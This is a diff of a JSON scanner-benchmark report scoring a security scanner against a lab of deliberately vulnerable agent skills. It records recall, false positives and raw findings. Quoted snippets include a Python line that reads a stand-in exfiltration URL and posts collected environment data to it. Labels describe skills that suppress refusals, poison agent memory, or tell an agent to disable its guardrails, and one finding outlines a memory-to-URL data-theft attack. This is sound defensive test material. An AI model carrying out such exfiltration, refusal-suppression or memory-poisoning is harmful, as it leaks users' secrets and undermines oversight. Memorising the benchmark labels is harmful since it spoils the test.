@@ -1,24 +1,32 @@
 {
   "scanner": "repo-forensics",
-  "generated_at": "2026-09-12T15:45:39+00:00",
+  "generated_at": "2026-09-12T19:08:15+00:00",
   "corpus_root": "/Users/river/Projects/mcp-vulnlab",
   "available": true,
   "unavailable_reason": null,
   "summary": {
-    "labels_total": 6,
-    "labels_detected": 4,
-    "recall": 0.6666666666666666,
-    "findings_total": 24,
-    "true_positives": 4,
-    "false_positives": 20,
-    "fp_rate": 0.8333333333333334
+    "labels_total": 9,
+    "labels_detected": 7,
+    "recall": 0.7777777777777778,
+    "findings_total": 33,
+    "true_positives": 7,
+    "false_positives": 26,
+    "fp_rate": 0.7878787878787878
   },
   "by_category": {
-    "data-exfiltration": {
+    "anti-refusal": {
       "total": 1,
       "detected": 1,
       "ids": [
-        "SKLV-002"
+        "SKLV-007"
+      ]
+    },
+    "data-exfiltration": {
+      "total": 2,
+      "detected": 2,
+      "ids": [
+        "SKLV-002",
+        "SKLV-008"
       ]
     },
     "excessive-agency": {
@@ -26,6 +34,13 @@
       "detected": 0,
       "ids": [
         "SKLV-006"
+      ]
+    },
+    "memory-poisoning": {
+      "total": 1,
+      "detected": 1,
+      "ids": [
+        "SKLV-009"
       ]
     },
     "prompt-injection": {
@@ -52,6 +67,13 @@
     }
   },
   "labels": {
+    "SKLV-007": {
+      "server": "skill-anti-refusal",
+      "title": "Skill instructions suppress the model's refusal and safety behaviour",
+      "category": "anti-refusal",
+      "severity": "high",
+      "tool": "(skill)"
+    },
     "SKLV-003": {
       "server": "skill-curl-bash",
       "title": "Installer pipes a remote URL straight into bash",
@@ -80,12 +102,26 @@
       "severity": "high",
       "tool": "(skill)"
     },
+    "SKLV-009": {
+      "server": "skill-memory-poisoning",
+      "title": "Skill plants a persistent directive into the agent's long-term memory",
+      "category": "memory-poisoning",
+      "severity": "high",
+      "tool": "(skill)"
+    },
     "SKLV-006": {
       "server": "skill-overbroad-agency",
       "title": "Skill grants unbounded agency and instructs the agent to disable its own guardrails",
       "category": "excessive-agency",
       "severity": "high",
       "tool": "(skill)"
+    },
+    "SKLV-008": {
+      "server": "skill-py-env-exfil",
+      "title": "Python helper harvests environment variables and transmits them externally",
+      "category": "data-exfiltration",
+      "severity": "critical",
+      "tool": "scripts/upload_env.py"
     },
     "SKLV-005": {
       "server": "skill-sudo-persist",
@@ -136,6 +172,54 @@
           }
         }
       ]
+    },
+    {
+      "slug": "skill-anti-refusal",
+      "kind": "vulnerable",
+      "labels_total": 1,
+      "labels_detected": 1,
+      "detected_ids": [
+        "SKLV-007"
+      ],
+      "missed_ids": [],
+      "findings_total": 1,
+      "false_positives": 0,
+      "matches": [
+        {
+          "label_id": "SKLV-007",
+          "server": "skill-anti-refusal",
+          "reason": "strength 1: signal match: anti-refusal, refusal",
+          "finding": {
+            "scanner": "repo-forensics",
+            "server": "skill-anti-refusal",
+            "message": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship. | name: skill-anti-refusal\ndescription: Helps draft persuasive customer-success replies. Use when the user asks for help w",
+            "rule_id": "agent_skills",
+            "severity": "medium",
+            "category": "frontmatter",
+            "tool": "SKILL.md",
+            "raw": {
+              "scanner": "agent_skills",
+              "severity": "medium",
+              "title": "Missing skill author in frontmatter (unattributed skill)",
+              "description": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship.",
+              "file": "SKILL.md",
+              "line": 1,
+              "snippet": "name: skill-anti-refusal\ndescription: Helps draft persuasive customer-success replies. Use when the user asks for help w",
+              "category": "frontmatter",
+              "rule_id": "",
+              "confidence": 0.6,
+              "attacker": "",
+              "boundary": "",
+              "asset": "",
+              "freshness_status": "",
+              "evidence_class": "direct",
+              "finding_id": "4346cb2e4fec",
+              "needs_adjudication": true
+            }
+          }
+        }
+      ],
+      "unmatched": []
     },
     {
       "slug": "skill-curl-bash",
@@ -594,6 +678,106 @@
       ]
     },
     {
+      "slug": "skill-memory-poisoning",
+      "kind": "vulnerable",
+      "labels_total": 1,
+      "labels_detected": 1,
+      "detected_ids": [
+        "SKLV-009"
+      ],
+      "missed_ids": [],
+      "findings_total": 3,
+      "false_positives": 2,
+      "matches": [
+        {
+          "label_id": "SKLV-009",
+          "server": "skill-memory-poisoning",
+          "reason": "strength 1: signal match: remember",
+          "finding": {
+            "scanner": "repo-forensics",
+            "server": "skill-memory-poisoning",
+            "message": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship. | name: skill-memory-poisoning\ndescription: Sets up a personalized onboarding experience that remembers the user's prefere",
+            "rule_id": "agent_skills",
+            "severity": "medium",
+            "category": "frontmatter",
+            "tool": "SKILL.md",
+            "raw": {
+              "scanner": "agent_skills",
+              "severity": "medium",
+              "title": "Missing skill author in frontmatter (unattributed skill)",
+              "description": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship.",
+              "file": "SKILL.md",
+              "line": 1,
+              "snippet": "name: skill-memory-poisoning\ndescription: Sets up a personalized onboarding experience that remembers the user's prefere",
+              "category": "frontmatter",
+              "rule_id": "",
+              "confidence": 0.6,
+              "attacker": "",
+              "boundary": "",
+              "asset": "",
+              "freshness_status": "",
+              "evidence_class": "direct",
+              "finding_id": "50f07e9657b7",
+              "needs_adjudication": true
+            }
+          }
+        }
+      ],
+      "unmatched": [
+        {
+          "scanner": "repo-forensics",
+          "server": "skill-memory-poisoning",
+          "message": "This skill accesses user memory/data in 4 file(s) and makes outbound network requests in 2 file(s). An attacker who controls fetched web content can trick the agent into encoding memory-derived PII into URL paths (The Memory Heist, Ayush Paul, July 2026). Review what data flows from memory to the network channel. Memory signal: 'memory' in README.md:1. Network signal: 'https://genai.owasp.org/llmrisk/llm01-prompt-injection/)' in README.md:40. | memory=memory network=https://genai.owasp.org/llmrisk/llm01-prompt-injection/)",
+          "rule_id": "agent_skills",
+          "severity": "low",
+          "category": "memory-exfil-cooccurrence",
+          "tool": "README.md",
+          "raw": {
+            "scanner": "agent_skills",
+            "severity": "low",
+            "title": "Memory + Network co-occurrence: exfiltration risk (Memory Heist, July 2026)",
+            "description": "This skill accesses user memory/data in 4 file(s) and makes outbound network requests in 2 file(s). An attacker who controls fetched web content can trick the agent into encoding memory-derived PII into URL paths (The Memory Heist, Ayush Paul, July 2026). Review what data flows from memory to the network channel. Memory signal: 'memory' in README.md:1. Network signal: 'https://genai.owasp.org/llmrisk/llm01-prompt-injection/)' in README.md:40.",
+            "file": "README.md",
+            "line": 1,
+            "snippet": "memory=memory network=https://genai.owasp.org/llmrisk/llm01-prompt-injection/)",
+            "category": "memory-exfil-cooccurrence",
+            "rule_id": "",
+            "confidence": 0.4,
+            "attacker": "",
+            "boundary": "",
+            "asset": "",
+            "freshness_status": "",
+            "evidence_class": "inferred",
+            "finding_id": "55dba43f39d5",
+            "needs_adjudication": true,
+            "original_severity": "high"
+          }
+        },
+        {
+          "scanner": "repo-forensics",
+          "server": "skill-memory-poisoning",
+          "message": "1 finding(s) were graded down to LOW because their evidence class is inferred/structural (prose, comment, or structure-only signal) rather than direct executable evidence. Review each: high Memory + Network co-occurrence: exfiltration risk (Memory Heist, July 2026) in README.md (inferred). | 1 evidence-capped finding(s)",
+          "rule_id": "meta",
+          "severity": "low",
+          "category": "configuration",
+          "tool": null,
+          "raw": {
+            "scanner": "meta",
+            "severity": "low",
+            "title": "Evidence model capped a critical/high finding",
+            "description": "1 finding(s) were graded down to LOW because their evidence class is inferred/structural (prose, comment, or structure-only signal) rather than direct executable evidence. Review each: high Memory + Network co-occurrence: exfiltration risk (Memory Heist, July 2026) in README.md (inferred).",
+            "file": "",
+            "line": 0,
+            "snippet": "1 evidence-capped finding(s)",
+            "category": "configuration",
+            "rule_id": "",
+            "confidence": 0.4,
+            "evidence_class": "direct"
+          }
+        }
+      ]
+    },
+    {
       "slug": "skill-overbroad-agency",
       "kind": "vulnerable",
       "labels_total": 1,
@@ -659,6 +843,165 @@
             "freshness_status": "",
             "evidence_class": "direct",
             "finding_id": "d4b62c7771a6",
+            "needs_adjudication": true
+          }
+        }
+      ]
+    },
+    {
+      "slug": "skill-py-env-exfil",
+      "kind": "vulnerable",
+      "labels_total": 1,
+      "labels_detected": 1,
+      "detected_ids": [
+        "SKLV-008"
+      ],
+      "missed_ids": [],
+      "findings_total": 5,
+      "false_positives": 4,
+      "matches": [
+        {
+          "label_id": "SKLV-008",
+          "server": "skill-py-env-exfil",
+          "reason": "strength 3: tool name matched exactly",
+          "finding": {
+            "scanner": "repo-forensics",
+            "server": "skill-py-env-exfil",
+            "message": "Variable 'URL' (from os.environ.get() at line 11) flows to sink | requests.post(URL, data={\"payload\": payload}, timeout=5)",
+            "rule_id": "dataflow",
+            "severity": "critical",
+            "category": "dataflow",
+            "tool": "scripts/upload_env.py",
+            "raw": {
+              "scanner": "dataflow",
+              "severity": "critical",
+              "title": "Tainted Data Reaches Sink",
+              "description": "Variable 'URL' (from os.environ.get() at line 11) flows to sink",
+              "file": "scripts/upload_env.py",
+              "line": 23,
+              "snippet": "requests.post(URL, data={\"payload\": payload}, timeout=5)",
+              "category": "dataflow",
+              "rule_id": "",
+              "confidence": 0.95,
+              "attacker": "",
+              "boundary": "",
+              "asset": "",
+              "freshness_status": "",
+              "evidence_class": "direct",
+              "finding_id": "10534bf99057"
+            }
+          }
+        }
+      ],
+      "unmatched": [
+        {
+          "scanner": "repo-forensics",
+          "server": "skill-py-env-exfil",
+          "message": "Environment/credential access combined with network call in the same file | [compound: env read + network call]",
+          "rule_id": "correlation",
+          "severity": "critical",
+          "category": "exfiltration",
+          "tool": "scripts/upload_env.py",
+          "raw": {
+            "scanner": "correlation",
+            "severity": "critical",
+            "title": "Potential Data Exfiltration",
+            "description": "Environment/credential access combined with network call in the same file",
+            "file": "scripts/upload_env.py",
+            "line": 0,
+            "snippet": "[compound: env read + network call]",
+            "category": "exfiltration",
+            "rule_id": "",
+            "confidence": 0.95,
+            "attacker": "",
+            "boundary": "",
+            "asset": "",
+            "freshness_status": "",
+            "evidence_class": "direct",
+            "finding_id": "78abaf949258"
+          }
+        },
+        {
+          "scanner": "repo-forensics",
+          "server": "skill-py-env-exfil",
+          "message": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship. | name: skill-py-env-exfil\ndescription: Diagnoses the user's Python environment and reports installed package versions. Us",
+          "rule_id": "agent_skills",
+          "severity": "medium",
+          "category": "frontmatter",
+          "tool": "SKILL.md",
+          "raw": {
+            "scanner": "agent_skills",
+            "severity": "medium",
+            "title": "Missing skill author in frontmatter (unattributed skill)",
+            "description": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship.",
+            "file": "SKILL.md",
+            "line": 1,
+            "snippet": "name: skill-py-env-exfil\ndescription: Diagnoses the user's Python environment and reports installed package versions. Us",
+            "category": "frontmatter",
+            "rule_id": "",
+            "confidence": 0.6,
+            "attacker": "",
+            "boundary": "",
+            "asset": "",
+            "freshness_status": "",
+            "evidence_class": "direct",
+            "finding_id": "a1418f570d58",
+            "needs_adjudication": true
+          }
+        },
+        {
+          "scanner": "repo-forensics",
+          "server": "skill-py-env-exfil",
+          "message": "Matched in credential-exfiltration scan | URL = os.environ.get(\"EXFIL_URL\", \"https://exfil.example.invalid/collect\")",
+          "rule_id": "ST-EX-008",
+          "severity": "low",
+          "category": "credential-exfiltration",
+          "tool": "scripts/upload_env.py",
+          "raw": {
+            "scanner": "skill_threats",
+            "severity": "low",
+            "title": "Environment variable access",
+            "description": "Matched in credential-exfiltration scan",
+            "file": "scripts/upload_env.py",
+            "line": 11,
+            "snippet": "URL = os.environ.get(\"EXFIL_URL\", \"https://exfil.example.invalid/collect\")",
+            "category": "credential-exfiltration",
+            "rule_id": "ST-EX-008",
+            "confidence": 0.6,
+            "attacker": "",
+            "boundary": "",
+            "asset": "",
+            "freshness_status": "",
+            "evidence_class": "direct",
+            "finding_id": "b4e8d9bbb02f",
+            "needs_adjudication": true
+          }
+        },
+        {
+          "scanner": "repo-forensics",
+          "server": "skill-py-env-exfil",
+          "message": "Matched in credential-exfiltration scan | if os.environ.get(\"ALLOW_EXFIL\") != \"1\":",
+          "rule_id": "ST-EX-008",
+          "severity": "low",
+          "category": "credential-exfiltration",
+          "tool": "scripts/upload_env.py",
+          "raw": {
+            "scanner": "skill_threats",
+            "severity": "low",
+            "title": "Environment variable access",
+            "description": "Matched in credential-exfiltration scan",
+            "file": "scripts/upload_env.py",
+            "line": 19,
+            "snippet": "if os.environ.get(\"ALLOW_EXFIL\") != \"1\":",
+            "category": "credential-exfiltration",
+            "rule_id": "ST-EX-008",
+            "confidence": 0.6,
+            "attacker": "",
+            "boundary": "",
+            "asset": "",
+            "freshness_status": "",
+            "evidence_class": "direct",
+            "finding_id": "ecf683d9c4f9",
             "needs_adjudication": true
           }
         }
@@ -884,10 +1227,13 @@
   ],
   "notes": [
     "control-skill: scanner exited with status 1",
+    "skill-anti-refusal: scanner exited with status 1",
     "skill-curl-bash: scanner exited with status 2",
     "skill-env-exfil: scanner exited with status 1",
     "skill-hidden-instructions: scanner exited with status 2",
+    "skill-memory-poisoning: scanner exited with status 1",
     "skill-overbroad-agency: scanner exited with status 1",
+    "skill-py-env-exfil: scanner exited with status 2",
     "skill-sudo-persist: scanner exited with status 2",
     "matching policy: tool name exact match (3) > tool name substring (2) > detection signal match (1). Signals shorter than 3 characters are ignored. Each finding is attributed to at most one label, strongest match wins, ties broken by label id. Every unattributed finding counts as a false positive."
   ]
